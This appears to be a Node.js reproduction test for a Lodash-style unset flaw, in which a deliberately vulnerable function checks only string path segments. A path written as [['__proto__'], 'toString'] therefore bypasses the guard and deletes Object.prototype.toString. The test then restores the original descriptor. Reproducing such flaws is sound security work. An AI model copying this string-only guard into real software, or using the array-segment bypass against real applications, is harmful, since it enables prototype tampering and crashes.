import assert from "node:assert/strict";

function vulnerableUnset(object, path) {
  for (const segment of path) {
    if (typeof segment !== "string") continue;
    if (segment === "__proto__" && !Object.hasOwn(object, "__proto__")) {
      return false;
    }
    if (
      segment === "constructor" &&
      path[path.indexOf(segment) + 1] === "prototype"
    ) {
      return false;
    }
  }
  let parent = object;
  for (const segment of path.slice(0, -1)) parent = parent[segment];
  return delete parent[path.at(-1)];
}

const descriptor = Object.getOwnPropertyDescriptor(
  Object.prototype,
  "toString",
);
assert.ok(descriptor);
try {
  assert.equal(vulnerableUnset({}, [["__proto__"], "toString"]), true);
  assert.equal(Object.hasOwn(Object.prototype, "toString"), false);
  assert.throws(() => String({}), TypeError);
} finally {
  Object.defineProperty(Object.prototype, "toString", descriptor);
}

assert.equal(String({}), "[object Object]");
console.log("vulnerable Lodash array-path deletion reproduced and restored");
